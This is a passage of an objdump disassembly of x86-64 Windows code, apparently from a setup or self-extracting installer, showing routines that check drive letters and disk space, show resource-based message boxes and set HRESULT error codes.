   1400056bc:	48 8d 54 24 34       	lea    0x34(%rsp),%rdx
   1400056c1:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400056c6:	48 ff 15 03 5e 00 00 	rex.W call *0x5e03(%rip)        # 0x14000b4d0
   1400056cd:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400056d2:	85 c0                	test   %eax,%eax
   1400056d4:	74 2a                	je     0x140005700
   1400056d6:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   1400056da:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   1400056e0:	0f af 4c 24 34       	imul   0x34(%rsp),%ecx
   1400056e5:	8b 54 24 38          	mov    0x38(%rsp),%edx
   1400056e9:	48 ff 15 c8 5d 00 00 	rex.W call *0x5dc8(%rip)        # 0x14000b4b8
   1400056f0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400056f5:	85 c0                	test   %eax,%eax
   1400056f7:	74 07                	je     0x140005700
   1400056f9:	3d 00 90 01 00       	cmp    $0x19000,%eax
   1400056fe:	73 10                	jae    0x140005710
   140005700:	8a 4c 24 40          	mov    0x40(%rsp),%cl
   140005704:	41 02 ce             	add    %r14b,%cl
   140005707:	88 4c 24 40          	mov    %cl,0x40(%rsp)
   14000570b:	e9 15 01 00 00       	jmp    0x140005825
   140005710:	45 33 c0             	xor    %r8d,%r8d
   140005713:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140005718:	41 8d 50 03          	lea    0x3(%r8),%edx
   14000571c:	e8 2b 06 00 00       	call   0x140005d4c
   140005721:	85 c0                	test   %eax,%eax
   140005723:	75 22                	jne    0x140005747
   140005725:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000572a:	e8 c9 dd ff ff       	call   0x1400034f8
   14000572f:	85 c0                	test   %eax,%eax
   140005731:	75 cd                	jne    0x140005700
   140005733:	45 33 c0             	xor    %r8d,%r8d
   140005736:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000573b:	41 8b d6             	mov    %r14d,%edx
   14000573e:	e8 09 06 00 00       	call   0x140005d4c
   140005743:	85 c0                	test   %eax,%eax
   140005745:	74 b9                	je     0x140005700
   140005747:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000574c:	e8 a7 dd ff ff       	call   0x1400034f8
   140005751:	85 c0                	test   %eax,%eax
   140005753:	74 14                	je     0x140005769
   140005755:	41 8b d4             	mov    %r12d,%edx
   140005758:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000575d:	48 ff 15 d4 5b 00 00 	rex.W call *0x5bd4(%rip)        # 0x14000b338
   140005764:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005769:	4c 8d 05 68 64 00 00 	lea    0x6468(%rip),%r8        # 0x14000bbd8
   140005770:	41 8b d4             	mov    %r12d,%edx
   140005773:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140005778:	e8 5f 3e 00 00       	call   0x1400095dc
   14000577d:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140005782:	48 ff 15 67 5b 00 00 	rex.W call *0x5b67(%rip)        # 0x14000b2f0
   140005789:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000578e:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005791:	75 15                	jne    0x1400057a8
   140005793:	33 d2                	xor    %edx,%edx
   140005795:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000579a:	48 ff 15 d7 5b 00 00 	rex.W call *0x5bd7(%rip)        # 0x14000b378
   1400057a1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400057a6:	eb 03                	jmp    0x1400057ab
   1400057a8:	83 e0 10             	and    $0x10,%eax
   1400057ab:	85 c0                	test   %eax,%eax
   1400057ad:	75 11                	jne    0x1400057c0
   1400057af:	8a 4c 24 40          	mov    0x40(%rsp),%cl
   1400057b3:	41 02 ce             	add    %r14b,%cl
   1400057b6:	88 5c 24 43          	mov    %bl,0x43(%rsp)
   1400057ba:	88 4c 24 40          	mov    %cl,0x40(%rsp)
   1400057be:	eb 65                	jmp    0x140005825
   1400057c0:	ba 02 00 00 00       	mov    $0x2,%edx
   1400057c5:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400057ca:	48 ff 15 6f 5b 00 00 	rex.W call *0x5b6f(%rip)        # 0x14000b340
   1400057d1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400057d6:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   1400057db:	49 8b d4             	mov    %r12,%rdx
   1400057de:	4d 2b c7             	sub    %r15,%r8
   1400057e1:	49 8b cf             	mov    %r15,%rcx
   1400057e4:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   1400057eb:	48 85 c0             	test   %rax,%rax
   1400057ee:	74 12                	je     0x140005802
   1400057f0:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   1400057f4:	84 c0                	test   %al,%al
   1400057f6:	74 0a                	je     0x140005802
   1400057f8:	88 01                	mov    %al,(%rcx)
   1400057fa:	49 03 ce             	add    %r14,%rcx
   1400057fd:	49 2b d6             	sub    %r14,%rdx
   140005800:	75 e2                	jne    0x1400057e4
   140005802:	48 85 d2             	test   %rdx,%rdx
   140005805:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140005809:	41 8b d6             	mov    %r14d,%edx
   14000580c:	48 0f 45 c1          	cmovne %rcx,%rax
   140005810:	45 33 c0             	xor    %r8d,%r8d
   140005813:	49 8b cf             	mov    %r15,%rcx
   140005816:	88 18                	mov    %bl,(%rax)
   140005818:	e8 a7 eb ff ff       	call   0x1400043c4
   14000581d:	85 c0                	test   %eax,%eax
   14000581f:	75 41                	jne    0x140005862
   140005821:	8a 4c 24 40          	mov    0x40(%rsp),%cl
   140005825:	80 f9 5a             	cmp    $0x5a,%cl
   140005828:	0f 8e 1e fe ff ff    	jle    0x14000564c
   14000582e:	41 8b d4             	mov    %r12d,%edx
   140005831:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140005836:	48 ff 15 fb 5a 00 00 	rex.W call *0x5afb(%rip)        # 0x14000b338
   14000583d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005842:	ba 03 00 00 00       	mov    $0x3,%edx
   140005847:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000584c:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   140005850:	e8 f7 04 00 00       	call   0x140005d4c
   140005855:	85 c0                	test   %eax,%eax
   140005857:	0f 85 b2 fd ff ff    	jne    0x14000560f
   14000585d:	e9 51 fc ff ff       	jmp    0x1400054b3
   140005862:	41 8b c6             	mov    %r14d,%eax
   140005865:	eb 26                	jmp    0x14000588d
   140005867:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   14000586c:	4c 8d 0d ed 22 00 00 	lea    0x22ed(%rip),%r9        # 0x140007b60
   140005873:	45 33 c0             	xor    %r8d,%r8d
   140005876:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000587b:	ba d2 07 00 00       	mov    $0x7d2,%edx
   140005880:	e8 1b 0e 00 00       	call   0x1400066a0
   140005885:	48 85 c0             	test   %rax,%rax
   140005888:	0f 95 c3             	setne  %bl
   14000588b:	8b c3                	mov    %ebx,%eax
   14000588d:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140005891:	48 33 cc             	xor    %rsp,%rcx
   140005894:	e8 17 43 00 00       	call   0x140009bb0
   140005899:	4c 8d 9c 24 60 01 00 	lea    0x160(%rsp),%r11
   1400058a0:	00 
   1400058a1:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   1400058a5:	49 8b 73 28          	mov    0x28(%r11),%rsi
   1400058a9:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   1400058ad:	4d 8b 63 38          	mov    0x38(%r11),%r12
   1400058b1:	49 8b e3             	mov    %r11,%rsp
   1400058b4:	41 5f                	pop    %r15
   1400058b6:	41 5e                	pop    %r14
   1400058b8:	5d                   	pop    %rbp
   1400058b9:	c3                   	ret
   1400058ba:	cc                   	int3
   1400058bb:	cc                   	int3
   1400058bc:	cc                   	int3
   1400058bd:	cc                   	int3
   1400058be:	cc                   	int3
   1400058bf:	cc                   	int3
   1400058c0:	cc                   	int3
   1400058c1:	cc                   	int3
   1400058c2:	cc                   	int3
   1400058c3:	cc                   	int3
   1400058c4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400058c9:	57                   	push   %rdi
   1400058ca:	48 83 ec 30          	sub    $0x30,%rsp
   1400058ce:	45 33 c0             	xor    %r8d,%r8d
   1400058d1:	48 8d 0d c8 62 00 00 	lea    0x62c8(%rip),%rcx        # 0x14000bba0
   1400058d8:	33 d2                	xor    %edx,%edx
   1400058da:	e8 6d fa ff ff       	call   0x14000534c
   1400058df:	b9 40 00 00 00       	mov    $0x40,%ecx
   1400058e4:	8b d8                	mov    %eax,%ebx
   1400058e6:	8d 50 01             	lea    0x1(%rax),%edx
   1400058e9:	48 ff 15 d0 5b 00 00 	rex.W call *0x5bd0(%rip)        # 0x14000b4c0
   1400058f0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400058f5:	48 8b f8             	mov    %rax,%rdi
   1400058f8:	48 85 c0             	test   %rax,%rax
   1400058fb:	75 2e                	jne    0x14000592b
   1400058fd:	21 44 24 28          	and    %eax,0x28(%rsp)
   140005901:	45 33 c9             	xor    %r9d,%r9d
   140005904:	45 33 c0             	xor    %r8d,%r8d
   140005907:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   14000590e:	00 
   14000590f:	ba b5 04 00 00       	mov    $0x4b5,%edx
   140005914:	33 c9                	xor    %ecx,%ecx
   140005916:	e8 bd 0a 00 00       	call   0x1400063d8
   14000591b:	e8 60 0e 00 00       	call   0x140006780
   140005920:	89 05 5e 9d 00 00    	mov    %eax,0x9d5e(%rip)        # 0x14000f684
   140005926:	e9 ca 00 00 00       	jmp    0x1400059f5
   14000592b:	44 8b c3             	mov    %ebx,%r8d
   14000592e:	48 8d 0d 6b 62 00 00 	lea    0x626b(%rip),%rcx        # 0x14000bba0
   140005935:	48 8b d7             	mov    %rdi,%rdx
   140005938:	e8 0f fa ff ff       	call   0x14000534c
   14000593d:	85 c0                	test   %eax,%eax
   14000593f:	75 39                	jne    0x14000597a
   140005941:	21 44 24 28          	and    %eax,0x28(%rsp)
   140005945:	45 33 c9             	xor    %r9d,%r9d
   140005948:	45 33 c0             	xor    %r8d,%r8d
   14000594b:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140005952:	00 
   140005953:	ba b1 04 00 00       	mov    $0x4b1,%edx
   140005958:	33 c9                	xor    %ecx,%ecx
   14000595a:	e8 79 0a 00 00       	call   0x1400063d8
   14000595f:	48 8b cf             	mov    %rdi,%rcx
   140005962:	48 ff 15 ef 59 00 00 	rex.W call *0x59ef(%rip)        # 0x14000b358
   140005969:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000596e:	c7 05 0c 9d 00 00 14 	movl   $0x80070714,0x9d0c(%rip)        # 0x14000f684
   140005975:	07 07 80 
   140005978:	eb 7b                	jmp    0x1400059f5
   14000597a:	48 8d 15 4f 61 00 00 	lea    0x614f(%rip),%rdx        # 0x14000bad0
   140005981:	48 8b cf             	mov    %rdi,%rcx
   140005984:	48 ff 15 3d 5a 00 00 	rex.W call *0x5a3d(%rip)        # 0x14000b3c8
   14000598b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005990:	85 c0                	test   %eax,%eax
   140005992:	75 16                	jne    0x1400059aa
   140005994:	48 8b cf             	mov    %rdi,%rcx
   140005997:	48 ff 15 ba 59 00 00 	rex.W call *0x59ba(%rip)        # 0x14000b358
   14000599e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400059a3:	b8 01 00 00 00       	mov    $0x1,%eax
   1400059a8:	eb 4d                	jmp    0x1400059f7
   1400059aa:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   1400059b1:	00 
   1400059b2:	45 33 c9             	xor    %r9d,%r9d
   1400059b5:	4c 8b c7             	mov    %rdi,%r8
   1400059b8:	c7 44 24 20 20 00 00 	movl   $0x20,0x20(%rsp)
   1400059bf:	00 
   1400059c0:	ba e9 03 00 00       	mov    $0x3e9,%edx
   1400059c5:	33 c9                	xor    %ecx,%ecx
   1400059c7:	e8 0c 0a 00 00       	call   0x1400063d8
   1400059cc:	48 8b cf             	mov    %rdi,%rcx
   1400059cf:	8b d8                	mov    %eax,%ebx
   1400059d1:	48 ff 15 80 59 00 00 	rex.W call *0x5980(%rip)        # 0x14000b358
   1400059d8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400059dd:	83 fb 06             	cmp    $0x6,%ebx
   1400059e0:	75 09                	jne    0x1400059eb
   1400059e2:	83 25 9b 9c 00 00 00 	andl   $0x0,0x9c9b(%rip)        # 0x14000f684
   1400059e9:	eb b8                	jmp    0x1400059a3
   1400059eb:	c7 05 8f 9c 00 00 c7 	movl   $0x800704c7,0x9c8f(%rip)        # 0x14000f684
   1400059f2:	04 07 80 
   1400059f5:	33 c0                	xor    %eax,%eax
   1400059f7:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400059fc:	48 83 c4 30          	add    $0x30,%rsp
   140005a00:	5f                   	pop    %rdi
   140005a01:	c3                   	ret
   140005a02:	cc                   	int3
   140005a03:	cc                   	int3
   140005a04:	cc                   	int3
   140005a05:	cc                   	int3
   140005a06:	cc                   	int3
   140005a07:	cc                   	int3
   140005a08:	cc                   	int3
   140005a09:	cc                   	int3
   140005a0a:	cc                   	int3
   140005a0b:	cc                   	int3
   140005a0c:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140005a11:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140005a16:	56                   	push   %rsi
   140005a17:	57                   	push   %rdi
   140005a18:	41 56                	push   %r14
   140005a1a:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   140005a21:	48 8b 05 58 86 00 00 	mov    0x8658(%rip),%rax        # 0x14000e080
   140005a28:	48 33 c4             	xor    %rsp,%rax
   140005a2b:	48 89 84 24 40 01 00 	mov    %rax,0x140(%rsp)
   140005a32:	00 
   140005a33:	48 8b ea             	mov    %rdx,%rbp
   140005a36:	48 89 0d 73 a5 00 00 	mov    %rcx,0xa573(%rip)        # 0x14000ffb0
   140005a3d:	48 8b f9             	mov    %rcx,%rdi
   140005a40:	33 db                	xor    %ebx,%ebx
   140005a42:	33 d2                	xor    %edx,%edx
   140005a44:	48 8d 0d 55 9c 00 00 	lea    0x9c55(%rip),%rcx        # 0x14000f6a0
   140005a4b:	41 b8 10 09 00 00    	mov    $0x910,%r8d
   140005a51:	8b f3                	mov    %ebx,%esi
   140005a53:	e8 4e c1 ff ff       	call   0x140001ba6
   140005a58:	33 d2                	xor    %edx,%edx
   140005a5a:	48 8d 0d df 93 00 00 	lea    0x93df(%rip),%rcx        # 0x14000ee40
   140005a61:	41 b8 2c 03 00 00    	mov    $0x32c,%r8d
   140005a67:	e8 3a c1 ff ff       	call   0x140001ba6
   140005a6c:	33 d2                	xor    %edx,%edx
   140005a6e:	48 8d 0d 6b 92 00 00 	lea    0x926b(%rip),%rcx        # 0x14000ece0
   140005a75:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140005a7b:	e8 26 c1 ff ff       	call   0x140001ba6
   140005a80:	44 8d 73 01          	lea    0x1(%rbx),%r14d
   140005a84:	44 8d 43 7f          	lea    0x7f(%rbx),%r8d
   140005a88:	44 89 35 c9 9e 00 00 	mov    %r14d,0x9ec9(%rip)        # 0x14000f958
   140005a8f:	48 8d 15 22 9c 00 00 	lea    0x9c22(%rip),%rdx        # 0x14000f6b8
   140005a96:	48 8d 0d df 5f 00 00 	lea    0x5fdf(%rip),%rcx        # 0x14000ba7c
   140005a9d:	e8 aa f8 ff ff       	call   0x14000534c
   140005aa2:	ff c8                	dec    %eax
   140005aa4:	45 33 c9             	xor    %r9d,%r9d
   140005aa7:	33 c9                	xor    %ecx,%ecx
   140005aa9:	83 f8 7f             	cmp    $0x7f,%eax
   140005aac:	0f 87 4e 02 00 00    	ja     0x140005d00
   140005ab2:	45 8b c6             	mov    %r14d,%r8d
   140005ab5:	41 8b d6             	mov    %r14d,%edx
   140005ab8:	48 ff 15 e1 59 00 00 	rex.W call *0x59e1(%rip)        # 0x14000b4a0
   140005abf:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005ac4:	48 8b c8             	mov    %rax,%rcx
   140005ac7:	48 89 05 62 8e 00 00 	mov    %rax,0x8e62(%rip)        # 0x14000e930
   140005ace:	48 ff 15 5b 59 00 00 	rex.W call *0x595b(%rip)        # 0x14000b430
   140005ad5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005ada:	44 8d 43 04          	lea    0x4(%rbx),%r8d
   140005ade:	48 8d 15 bf a4 00 00 	lea    0xa4bf(%rip),%rdx        # 0x14000ffa4
   140005ae5:	48 8d 0d 9c 5f 00 00 	lea    0x5f9c(%rip),%rcx        # 0x14000ba88
   140005aec:	e8 5b f8 ff ff       	call   0x14000534c
   140005af1:	85 c0                	test   %eax,%eax
   140005af3:	75 2d                	jne    0x140005b22
   140005af5:	45 33 c9             	xor    %r9d,%r9d
   140005af8:	45 33 c0             	xor    %r8d,%r8d
   140005afb:	33 c9                	xor    %ecx,%ecx
   140005afd:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140005b01:	ba b1 04 00 00       	mov    $0x4b1,%edx
   140005b06:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140005b0d:	00 
   140005b0e:	e8 c5 08 00 00       	call   0x1400063d8
   140005b13:	c7 05 67 9b 00 00 14 	movl   $0x80070714,0x9b67(%rip)        # 0x14000f684
   140005b1a:	07 07 80 
   140005b1d:	e9 f7 01 00 00       	jmp    0x140005d19
   140005b22:	8b 05 7c a4 00 00    	mov    0xa47c(%rip),%eax        # 0x14000ffa4
   140005b28:	a8 40                	test   $0x40,%al
   140005b2a:	75 08                	jne    0x140005b34
   140005b2c:	84 c0                	test   %al,%al
   140005b2e:	0f 89 ca 00 00 00    	jns    0x140005bfe
   140005b34:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140005b3a:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140005b3f:	48 8d 0d 52 5f 00 00 	lea    0x5f52(%rip),%rcx        # 0x14000ba98
   140005b46:	e8 01 f8 ff ff       	call   0x14000534c
   140005b4b:	33 c9                	xor    %ecx,%ecx
   140005b4d:	85 c0                	test   %eax,%eax
   140005b4f:	75 08                	jne    0x140005b59
   140005b51:	45 33 c9             	xor    %r9d,%r9d
   140005b54:	45 33 c0             	xor    %r8d,%r8d
   140005b57:	eb a4                	jmp    0x140005afd
   140005b59:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140005b5e:	41 8b d6             	mov    %r14d,%edx
   140005b61:	48 ff 15 78 58 00 00 	rex.W call *0x5878(%rip)        # 0x14000b3e0
   140005b68:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005b6d:	48 89 05 9c 8d 00 00 	mov    %rax,0x8d9c(%rip)        # 0x14000e910
   140005b74:	48 85 c0             	test   %rax,%rax
   140005b77:	0f 84 81 00 00 00    	je     0x140005bfe
   140005b7d:	48 ff 15 64 57 00 00 	rex.W call *0x5764(%rip)        # 0x14000b2e8
   140005b84:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005b89:	3d b7 00 00 00       	cmp    $0xb7,%eax
   140005b8e:	75 6e                	jne    0x140005bfe
   140005b90:	45 33 c9             	xor    %r9d,%r9d
   140005b93:	4c 8d 05 1e 9b 00 00 	lea    0x9b1e(%rip),%r8        # 0x14000f6b8
   140005b9a:	33 c9                	xor    %ecx,%ecx
   140005b9c:	f6 05 01 a4 00 00 80 	testb  $0x80,0xa401(%rip)        # 0x14000ffa4
   140005ba3:	74 18                	je     0x140005bbd
   140005ba5:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140005ba9:	ba 4b 05 00 00       	mov    $0x54b,%edx
   140005bae:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140005bb5:	00 
   140005bb6:	e8 1d 08 00 00       	call   0x1400063d8
   140005bbb:	eb 1f                	jmp    0x140005bdc
   140005bbd:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140005bc4:	00 
   140005bc5:	ba 24 05 00 00       	mov    $0x524,%edx
   140005bca:	c7 44 24 20 20 00 00 	movl   $0x20,0x20(%rsp)
   140005bd1:	00 
   140005bd2:	e8 01 08 00 00       	call   0x1400063d8
   140005bd7:	83 f8 06             	cmp    $0x6,%eax
   140005bda:	74 22                	je     0x140005bfe
   140005bdc:	48 8b 0d 2d 8d 00 00 	mov    0x8d2d(%rip),%rcx        # 0x14000e910
   140005be3:	48 ff 15 36 57 00 00 	rex.W call *0x5736(%rip)        # 0x14000b320
   140005bea:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005bef:	c7 05 8b 9a 00 00 b7 	movl   $0x800700b7,0x9a8b(%rip)        # 0x14000f684
   140005bf6:	00 07 80 
   140005bf9:	e9 1b 01 00 00       	jmp    0x140005d19
   140005bfe:	48 8b cd             	mov    %rbp,%rcx
   140005c01:	89 1d 79 9a 00 00    	mov    %ebx,0x9a79(%rip)        # 0x14000f680
   140005c07:	e8 e0 0d 00 00       	call   0x1400069ec
   140005c0c:	85 c0                	test   %eax,%eax
   140005c0e:	75 0f                	jne    0x140005c1f
   140005c10:	45 33 c9             	xor    %r9d,%r9d
   140005c13:	ba 20 05 00 00       	mov    $0x520,%edx
   140005c18:	33 c9                	xor    %ecx,%ecx
   140005c1a:	e9 e6 00 00 00       	jmp    0x140005d05
   140005c1f:	38 1d 35 92 00 00    	cmp    %bl,0x9235(%rip)        # 0x14000ee5a
   140005c25:	74 11                	je     0x140005c38
   140005c27:	48 8d 0d 2c 92 00 00 	lea    0x922c(%rip),%rcx        # 0x14000ee5a
   140005c2e:	e8 41 cc ff ff       	call   0x140002874
   140005c33:	e9 e1 00 00 00       	jmp    0x140005d19
   140005c38:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   140005c3e:	48 8d 15 63 5e 00 00 	lea    0x5e63(%rip),%rdx        # 0x14000baa8
   140005c45:	48 8b cf             	mov    %rdi,%rcx
   140005c48:	48 ff 15 89 57 00 00 	rex.W call *0x5789(%rip)        # 0x14000b3d8
   140005c4f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005c54:	48 85 c0             	test   %rax,%rax
   140005c57:	74 15                	je     0x140005c6e
   140005c59:	48 8b d0             	mov    %rax,%rdx
   140005c5c:	48 8b cf             	mov    %rdi,%rcx
   140005c5f:	48 ff 15 02 58 00 00 	rex.W call *0x5802(%rip)        # 0x14000b468
   140005c66:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005c6b:	48 8b f0             	mov    %rax,%rsi
   140005c6e:	39 1d e8 85 00 00    	cmp    %ebx,0x85e8(%rip)        # 0x14000e25c
   140005c74:	74 0c                	je     0x140005c82
   140005c76:	48 ff 15 0b 56 00 00 	rex.W call *0x560b(%rip)        # 0x14000b288
   140005c7d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005c82:	39 1d bc 91 00 00    	cmp    %ebx,0x91bc(%rip)        # 0x14000ee44
   140005c88:	74 08                	je     0x140005c92
   140005c8a:	41 8b c6             	mov    %r14d,%eax
   140005c8d:	e9 89 00 00 00       	jmp    0x140005d1b
   140005c92:	48 8b ce             	mov    %rsi,%rcx
   140005c95:	e8 fe e2 ff ff       	call   0x140003f98
   140005c9a:	85 c0                	test   %eax,%eax
   140005c9c:	74 7b                	je     0x140005d19
   140005c9e:	0f b7 05 13 a3 00 00 	movzwl 0xa313(%rip),%eax        # 0x14000ffb8
   140005ca5:	66 41 2b c6          	sub    %r14w,%ax
   140005ca9:	66 83 f8 02          	cmp    $0x2,%ax
   140005cad:	77 db                	ja     0x140005c8a
   140005caf:	f7 05 eb a2 00 00 00 	testl  $0x100,0xa2eb(%rip)        # 0x14000ffa4
   140005cb6:	01 00 00 
   140005cb9:	74 cf                	je     0x140005c8a
   140005cbb:	44 84 35 96 91 00 00 	test   %r14b,0x9196(%rip)        # 0x14000ee58
   140005cc2:	75 c6                	jne    0x140005c8a
   140005cc4:	e8 27 d6 ff ff       	call   0x1400032f0
   140005cc9:	85 c0                	test   %eax,%eax
   140005ccb:	75 bd                	jne    0x140005c8a
   140005ccd:	48 c7 44 24 28 3e 08 	movq   $0x83e,0x28(%rsp)
   140005cd4:	00 00 
   140005cd6:	4c 8d 0d e3 db ff ff 	lea    -0x241d(%rip),%r9        # 0x1400038c0
   140005cdd:	45 33 c0             	xor    %r8d,%r8d
   140005ce0:	48 c7 44 24 20 47 05 	movq   $0x547,0x20(%rsp)
   140005ce7:	00 00 
   140005ce9:	ba d6 07 00 00       	mov    $0x7d6,%edx
   140005cee:	e8 ad 09 00 00       	call   0x1400066a0
   140005cf3:	48 3d 3d 08 00 00    	cmp    $0x83d,%rax
   140005cf9:	0f 94 c3             	sete   %bl
   140005cfc:	8b c3                	mov    %ebx,%eax
   140005cfe:	eb 1b                	jmp    0x140005d1b
   140005d00:	ba b1 04 00 00       	mov    $0x4b1,%edx
   140005d05:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140005d09:	45 33 c0             	xor    %r8d,%r8d
   140005d0c:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140005d13:	00 
   140005d14:	e8 bf 06 00 00       	call   0x1400063d8
   140005d19:	33 c0                	xor    %eax,%eax
   140005d1b:	48 8b 8c 24 40 01 00 	mov    0x140(%rsp),%rcx
   140005d22:	00 
   140005d23:	48 33 cc             	xor    %rsp,%rcx
   140005d26:	e8 85 3e 00 00       	call   0x140009bb0
   140005d2b:	4c 8d 9c 24 50 01 00 	lea    0x150(%rsp),%r11
   140005d32:	00 
   140005d33:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140005d37:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   140005d3b:	49 8b e3             	mov    %r11,%rsp
   140005d3e:	41 5e                	pop    %r14
   140005d40:	5f                   	pop    %rdi
   140005d41:	5e                   	pop    %rsi
   140005d42:	c3                   	ret
   140005d43:	cc                   	int3
   140005d44:	cc                   	int3
   140005d45:	cc                   	int3
   140005d46:	cc                   	int3
   140005d47:	cc                   	int3
   140005d48:	cc                   	int3
   140005d49:	cc                   	int3
   140005d4a:	cc                   	int3
   140005d4b:	cc                   	int3
   140005d4c:	48 8b c4             	mov    %rsp,%rax
   140005d4f:	48 89 58 10          	mov    %rbx,0x10(%rax)
   140005d53:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140005d57:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140005d5b:	55                   	push   %rbp
   140005d5c:	41 54                	push   %r12
   140005d5e:	41 55                	push   %r13
   140005d60:	41 56                	push   %r14
   140005d62:	41 57                	push   %r15
   140005d64:	48 8d a8 58 fd ff ff 	lea    -0x2a8(%rax),%rbp
   140005d6b:	48 81 ec 80 03 00 00 	sub    $0x380,%rsp
   140005d72:	48 8b 05 07 83 00 00 	mov    0x8307(%rip),%rax        # 0x14000e080
   140005d79:	48 33 c4             	xor    %rsp,%rax
   140005d7c:	48 89 85 70 02 00 00 	mov    %rax,0x270(%rbp)
   140005d83:	45 33 ed             	xor    %r13d,%r13d
   140005d86:	45 8b e0             	mov    %r8d,%r12d
   140005d89:	44 89 6c 24 54       	mov    %r13d,0x54(%rsp)
   140005d8e:	44 8b fa             	mov    %edx,%r15d
   140005d91:	44 89 6c 24 4c       	mov    %r13d,0x4c(%rsp)
   140005d96:	48 8b f9             	mov    %rcx,%rdi
   140005d99:	85 d2                	test   %edx,%edx
   140005d9b:	75 08                	jne    0x140005da5
   140005d9d:	8d 42 01             	lea    0x1(%rdx),%eax
   140005da0:	e9 ff 02 00 00       	jmp    0x1400060a4
   140005da5:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140005daa:	b9 04 01 00 00       	mov    $0x104,%ecx
   140005daf:	48 ff 15 42 56 00 00 	rex.W call *0x5642(%rip)        # 0x14000b3f8
   140005db6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005dbb:	48 8b cf             	mov    %rdi,%rcx
   140005dbe:	48 ff 15 4b 56 00 00 	rex.W call *0x564b(%rip)        # 0x14000b410
   140005dc5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005dca:	33 c9                	xor    %ecx,%ecx
   140005dcc:	85 c0                	test   %eax,%eax
   140005dce:	75 2d                	jne    0x140005dfd
   140005dd0:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140005dd5:	45 33 c9             	xor    %r9d,%r9d
   140005dd8:	45 33 c0             	xor    %r8d,%r8d
   140005ddb:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140005de2:	00 
   140005de3:	ba bc 04 00 00       	mov    $0x4bc,%edx
   140005de8:	e8 eb 05 00 00       	call   0x1400063d8
   140005ded:	e8 8e 09 00 00       	call   0x140006780
   140005df2:	89 05 8c 98 00 00    	mov    %eax,0x988c(%rip)        # 0x14000f684
   140005df8:	e9 a5 02 00 00       	jmp    0x1400060a2
   140005dfd:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
